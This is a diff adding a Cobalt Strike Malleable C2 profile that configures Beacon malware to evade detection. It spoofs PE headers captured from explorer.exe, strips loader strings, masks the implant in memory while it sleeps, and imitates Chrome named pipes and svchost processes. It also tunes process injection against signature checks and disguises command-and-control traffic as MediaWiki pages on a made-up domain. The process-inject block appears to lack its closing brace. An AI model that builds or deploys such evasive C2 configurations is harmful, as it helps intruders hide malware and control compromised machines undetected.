@@ -1,0 +1,241 @@
+# Malleable C2 Profile
+# Version: CobaltStrike 3.13
+# Description: 
+#    A quick and dirty merge of the jsquery c2 profile from
+# Authors: @joevest, @andrewchiles, @001SPARTaN #
+#
+# and the wiki c2 profile from
+# Author: @bluscreenofjeff
+#
+
+#set https cert info
+https-certificate {
+    set CN       "*.GreenMythologyFacts.local"; #Common Name
+    set C        "US"; #Country
+    set L        "San Francisco"; #Locality
+    set OU       "Greek Mythological Foundation Of America"; #Organizational Unit Name
+    set ST       "CA"; #State or Province
+    set validity "365"; #Number of days the cert is valid for
+}
+
+#default Beacon sleep duration and jitter
+set sleeptime "60000";
+set jitter    "85";
+
+#default useragent for HTTP comms
+#set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
+set useragent "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
+
+#IP address used to indicate no tasks are available to DNS Beacon
+set dns_idle "8.8.4.4";
+
+#Force a sleep prior to each individual DNS request. (in milliseconds)
+set dns_sleep "0";
+
+#Maximum length of hostname when uploading data over DNS (0-255)
+set maxdns    "235";
+
+set host_stage "false"; # Do not use staging. Must use stagles payloads
+set tcp_port "42585";
+set spawnto_x86 "%windir%\\syswow64\\svchost.exe -k netsvcs";
+set spawnto_x64 "%windir%\\sysnative\\svchost.exe -k netsvcs";
+
+set pipename         "mojo.5688.8052.183894939787088877##"; # Common Chrome named pipe
+set pipename_stager  "mojo.5688.8052.35780273329370473##"; # Common Chrome named pipe
+##TODO CHANGE PIPE NAMES
+
+
+
+################################################
+## Memory Indicators
+################################################
+## Description:
+##    The stage block in Malleable C2 profiles controls how Beacon is loaded into memory and edit the content of the Beacon DLL.
+## Values:
+##    checksum      	0	The CheckSum value in Beacon's PE header
+##    cleanup           false	Ask Beacon to attempt to free memory associated with the Reflective DLL package that initialized it.
+##    compile_time	    14 July 2009 8:14:00	The build time in Beacon's PE header
+##    entry_point	    92145	The EntryPoint value in Beacon's PE header
+##    image_size_x64	512000	SizeOfImage value in x64 Beacon's PE header
+##    image_size_x86	512000	SizeOfImage value in x86 Beacon's PE header
+##    module_x64	    xpsservices.dll	Same as module_x86; affects x64 loader
+##    module_x86	    xpsservices.dll	Ask the x86 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc.
+##    name	            beacon.x64.dll	The Exported name of the Beacon DLL
+##    obfuscate	        false	Obfuscate the Reflective DLL's import table, overwrite unused header content, and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers.
+##    rich_header		N/A     Meta-information inserted by the compiler
+##    sleep_mask        false   Obfuscate Beacon (HTTP only), in-memory, prior to sleeping
+##    stomppe	        true	Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload
+##    userwx	        false	Ask ReflectiveLoader to use or avoid RWX permissions for Beacon DLL in memory
+stage {
+    set userwx         "false"; 
+    set stomppe        "true";
+    set obfuscate      "true";
+    set name           "srv.dll";
+    set cleanup        "true";
+
+    # Values captured using peclone agaist a Windows 10 version of explorer.exe
+    set checksum       "0";
+	set compile_time   "13 Nov 2018 06:07:22";
+	set entry_point    "650688";
+	set image_size_x86 "4661248";
+	set image_size_x64 "4661248";
+	set rich_header    "\x3e\x98\xfe\x75\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x73\x81\x03\x26\xfc\xf9\x90\x26\x17\xa4\x93\x27\x79\xf9\x90\x26\x7a\xf9\x91\x26\x83\xfd\x90\x26\x17\xa4\x91\x27\x65\xf9\x90\x26\x17\xa4\x95\x27\x77\xf9\x90\x26\x17\xa4\x94\x27\x6c\xf9\x90\x26\x17\xa4\x9e\x27\x56\xf8\x90\x26\x17\xa4\x6f\x26\x7b\xf9\x90\x26\x17\xa4\x92\x27\x7b\xf9\x90\x26\x52\x69\x63\x68\x7a\xf9\x90\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+
+    # CS 3.12 "Obfuscate and Sleep" for HTTP Beacons
+    set sleep_mask     "true";
+
+    ## WARNING: Module stomping 
+    # Cobalt Strike 3.11 also adds module stomping to Beacon's Reflective Loader. When enabled, Beacon's loader will shun VirtualAlloc and instead load a DLL into the current process and overwrite its memory.
+    # Set module_x86 to a favorite x86 DLL to module stomp with the x86 Beacon. The module_x64 option enables this for the x64 Beacon.
+    # While this is a powerful feature, caveats apply! If the library you load is not large enough to host Beacon, you will crash Beacon's process. If the current process loads the same library later (for whatever reason), you will crash Beacon's process. Choose carefully.
+    # By default, Beacon's loader allocates memory with VirtualAlloc. Module stomping is an alternative to this. Set module_x86 to a DLL that is about twice as large as the Beacon payload itself. Beacon's x86 loader will load the specified DLL, find its location in memory, and overwrite it. This is a way to situate Beacon in memory that Windows associates with a file on disk. It's important that the DLL you choose is not needed by the applications you intend to reside in. The module_x64 option is the same story, but it affects the x64 Beacon.
+    # Details can be found in the In-memory Evasion video series. https://youtu.be/uWVH9l2GMw4
+
+    # set module_x64 "netshell.dll";
+    # set module_x86 "netshell.dll";
+
+    # The transform-x86 and transform-x64 blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
+    transform-x86 { # transform the x86 rDLL stage
+        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # prepend null bytes
+        strrep "ReflectiveLoader" "execute"; # Change this text
+        strrep "This program cannot be run in DOS mode" ""; # Remove this text
+        strrep "beacon.dll"       ""; # Remove this text
+    }
+    transform-x64 { # transform the x64 rDLL stage
+        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # prepend null bytes
+        strrep "ReflectiveLoader" "execute"; # Change this text
+        strrep "beacon.x64.dll"   ""; # Remove this text
+    }
+
+    #stringw "jQuery"; # Add string to binary
+}
+
+################################################
+## Process Injection
+################################################
+## Description:
+##    The process-inject block in Malleable C2 profiles shapes injected content and controls process injection behavior.
+## Values:
+##    min_alloc         4096    Minimum amount of memory to request for injected content.
+##    startrwx          false   Use RWX as initial permissions for injected content. Alternative is RW.
+##    userwx            false   Use RWX as final permissions for injected content. Alternative is RX.
+## Guidelines:
+##    - Modify the indicators to minimize in memory indicators
+#     - Refer to 
+##       https://www.cobaltstrike.com/help-malleable-c2#processinject
+
+process-inject {
+    # Minimium memory allocation size when injecting content
+    set min_alloc "17500";
+
+    # Set memory permissions as permissions as initial=RWX, final=RX
+    set startrwx "true";
+    set userwx   "false";
+
+    # Transform injected content to avoid signature detection of first few bytes
+    transform-x86 {
+        prepend "\x90\x90";
+        #append "\x90\x90";
+    }
+
+    transform-x64 {
+        prepend "\x90\x90";
+        #append "\x90\x90";
+    }
+
+    
+    # Only code injection technique that doesn't appear to break anything when disabled
+    disable "SetThreadContext";
+
+
+http-get {
+
+    set uri "/w/index.php";
+
+    client {
+
+        header "Host" "greekmythologyfacts.local";
+        header "Accept" "text/html,application/xhtml+xml,application/xml;";
+        header "Referer" "https://greekmythologyfacts.local/wiki/Main_Page";
+
+        #session metadata
+        metadata {
+            base64url;
+            parameter "search";
+        }
+        parameter "title" "Special%3ASearch";
+        parameter "go" "Go";
+    }
+
+
+    server {
+
+        header "Server" "mw1178.eqiad.wmnet";
+        header "X-Powered-By" "HHVM/3.12.7";
+        header "X-Content-Type-Options" "nosniff";
+        header "P3P" "CP=This is not a P3P policy! See https://greekmythologyfacts.local/wiki/Special:CentralAutoLogin/P3P for more info.";
+        header "Vary" "Accept-Encoding,X-Forwarded-Proto,Cookie,Authorization";
+
+        #Beacon's tasks
+        output {
+            netbios;
+            prepend "<!DOCTYPE html><html class=client-nojs lang=en dir=ltr><head><meta charset=UTF-8/><title>greekmythologyfacts</title><script>document.documentElement.className = document.documentElement.className.replace( /(^|s)client-nojs(s|$)/, $1client-js$2 );</script><script>(window.RLQ=window.RLQ||[]).push(function(){mw.config.set({wgCanonicalNamespace:,wgCanonicalSpecialPageName:false,wgNamespaceNumber:0,,wgBetaFeaturesFeatures:[],wgMediaViewerOnClick:true,wgMediaViewerEnabledByDefault:true,wgVisualEditor:{pageLanguageCode:en,pageLanguageDir:ltr,usePageImages:true,usePageDescriptions:true},wgPreferredVariant:en,wgMFDisplayWikibaseDescriptions:{search:true,nearby:true,watchlist:true,tagline:false},wgRelatedArticles:null,wgRelatedArticlesUseCirrusSearch:true,wgRelatedArticlesOnlyUseCirrusSearch:false,wgULSCurrentAutonym:English,wgNoticeProject:greekmythologyfacts,wgCentralNoticeCookiesToDelete:[],wgCentralNoticeCategoriesUsingLegacy:[Fundraising,fundraising],wgCategoryTreePageCategoryOptions:{mode:0,hideprefix:20,showcount:true,namespaces:false},wgWikibaseItemId:";
+
+            append ",wgCentralAuthMobileDomain:false,wgVisualEditorToolbarScrollOffset:0,wgEditSubmitButtonLabelPublish:false});mw.loader.state({ext.globalCssJs.user.styles:ready,ext.globalCssJs.site.styles:ready,site.styles:ready,noscript:ready,user.styles:ready,user:ready,user.options:loading,user.tokens:loading,wikibase.client.init:ready,ext.visualEditor.desktopArticleTarget.noscript:ready,ext.uls.interlanguage:ready,ext.greekmythologyfactsBadges:ready,mediawiki.legacy.shared:ready,mediawiki.legacy.commonPrint:ready,mediawiki.sectionAnchor:ready,mediawiki.skinning.interface:ready,skins.vector.styles:ready,ext.globalCssJs.user:ready,ext.globalCssJs.site:ready});mw.loader.implement(user.options@0j3lz3q,function($,jQuery,require,module){mw.user.options.set({variant:en});});mw.loader.implement(user.tokens@1dqfd7l,function ( $, jQuery, require, module )</script><link rel=stylesheet href=/w/load.php?debug=false&amp;lang=en&amp;modules=ext.uls.interlanguage%7Cext.visualEditor.desktopArticleTarget.noscript%7Cext.greekmythologyfactsBadges%7Cmediawiki.legacy.commonPrint%2Cshared%7Cmediawiki.sectionAnchor%7Cmediawiki.skinning.interface%7Cskins.vector.styles%7Cwikibase.client.init&amp;only=styles&amp;skin=vector/><script async= src=/w/load.php?debug=false&amp;lang=en&amp;modules=startup&amp;only=scripts&amp;skin=vector></script><meta name=ResourceLoaderDynamicStyles content=/><link rel=stylesheet href=/w/load.php?debug=false&amp;lang=en&amp;modules=site.styles&amp;only=styles&amp;skin=vector/>";
+
+            print;
+        }
+    }
+}
+
+http-post {
+    
+    set uri "/wiki";
+    set verb "GET";
+
+    client {
+
+        header "Host" "greekmythologyfacts.local";
+        header "Accept" "text/html,application/xhtml+xml,application/xml;";
+
+        #session ID
+        id {
+            base64url;
+            prepend "/";
+            uri-append;
+        }
+
+
+        #Beacon's responses
+        output {
+            base64url;
+            prepend "https://greekmythologyfacts.local/w/index.php?search=";
+            append "&title=Special%3ASearch&go=Go";
+            header "Referer";
+        }
+    }
+
+    server {
+
+        header "Server" "mw1178.eqiad.wmnet";
+        header "X-Powered-By" "HHVM/3.12.7";
+        header "X-Content-Type-Options" "nosniff";
+        header "P3P" "CP=This is not a P3P policy! See https://greekmythologyfacts.local/wiki/Special:CentralAutoLogin/P3P for more info.";
+        header "Vary" "Accept-Encoding,X-Forwarded-Proto,Cookie,Authorization";
+
+        #empty
+        output {
+
+            prepend "<body class=mediawiki ltr sitedir-ltr mw-hide-empty-elt ns-0 ns-subject page-Test rootpage-Test skin-vector action-view><div id=mw-page-base class=noprint></div><div id=mw-head-base class=noprint></div><div id=content class=mw-body role=main><a id=top></a><div id=siteNotice><!-- CentralNotice --></div><div class=mw-indicators><div id=mw-indicator-pp-default class=mw-indicator><a href=/wiki/greekmythologyfacts:Protection_policy#semi title=This article is semi-protected due to vandalism><img alt=Page semi-protected src=//upload.greekmythologyfacts.local/greekmythologyfacts/commons/thumb/f/fc/Padlock-silver.svg/20px-Padlock-silver.svg.png width=20 height=20 srcset=//upload.greekmythologyfacts.local/greekmythologyfacts/commons/thumb/f/fc/Padlock-silver.svg/30px-Padlock-silver.svg.png 1.5x, //upload.greekmythologyfacts.local/greekmythologyfacts/commons/thumb/f/fc/Padlock-silver.svg/40px-Padlock-silver.svg.png 2x data-file-width=128 data-file-height=128 /></a></div></div><h1 id=firstHeading class=firstHeading lang=en>greekmythologyfacts</h1><div id=bodyContent class=mw-body-content><div id=siteSub>From greekmythologyfacts, the free encyclopedia</div><div id=contentSub><span class=mw-redirectedfrom>ￂﾠￂﾠ(Redirected from <a href=/w/index.php?title=Testing&amp;redirect=no class=mw-redirect title=Testing>Testing</a>)</span></div><div id=jump-to-nav class=mw-jump>Jump to:<a href=#mw-head>navigation</a>,<a href=#p-search>search</a></div><div id=mw-content-text lang=en dir=ltr class=mw-content-ltr><script>function mfTempOpenSection(id){var block=document.getElementById(mf-section-+id);block.className+= open-block;block.previousSibling.className+= open-block;}</script><table class=plainlinks metadata ambox ambox-content role=presentation><tr><td class=mbox-image><div style=width:52px><img alt= src=//upload.greekmythologyfacts.local/greekmythologyfacts/commons/thumb/e/e9/Sandbox_Not.svg/50px-Sandbox_Not.svg.png width=50 height=50 srcset=//upload.greekmythologyfacts.local/greekmythologyfacts/commons/thumb/e/e9/Sandbox_Not.svg/75px-Sandbox_Not.svg.png 1.5x, //upload.greekmythologyfacts.local/greekmythologyfacts/commons/thumb/e/e9/Sandbox_Not.svg/100px-Sandbox_Not.svg.png 2x data-file-width=766 data-file-height=766 /></div></td>";
+
+            print;
+        }
+    }
+}
+
+#change the stager server
+http-stager {
+    server {
+        header "Content-Type" "text/html";
+    }
+}
